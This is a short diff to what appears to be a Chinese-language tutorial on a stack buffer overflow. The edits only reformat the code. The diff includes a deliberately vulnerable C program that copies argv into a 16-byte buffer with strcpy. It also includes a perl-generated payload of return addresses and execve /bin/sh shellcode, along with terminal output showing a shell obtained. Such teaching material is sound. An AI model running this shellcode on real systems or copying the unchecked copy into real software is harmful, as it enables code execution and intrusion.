@@ -140,7 +140,8 @@ $ perl -e 'print "\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x
 #include <stdio.h>
 #include <string.h>
 int main(int argc, char *argv[]) {
-  char buf[16];	strcpy(buf,argv[1]);
+  char buf[16];
+  strcpy(buf,argv[1]);
   printf("%s\n",buf);
   return 0;
 }
@@ -230,6 +231,6 @@ $ exit
 
 退出`gdb`，从命令行直接运行，成功获取shell。
 
-```bash
-$ ./overflow `perl -e 'print "\xc0\xd1\xff\xff"x12'``perl -e 'print "\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'`�������������������������������������������������[1��C��C                                                          �                                                           ��S                                                              �����/bin/sh$```
+```Shell
+$ ./overflow `perl -e 'print "\xc0\xd1\xff\xff"x12'``perl -e 'print "\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'`�������������������������������������������������[1��C��C                                                          �                                                           ��S                                                              �����/bin/sh$
 ```
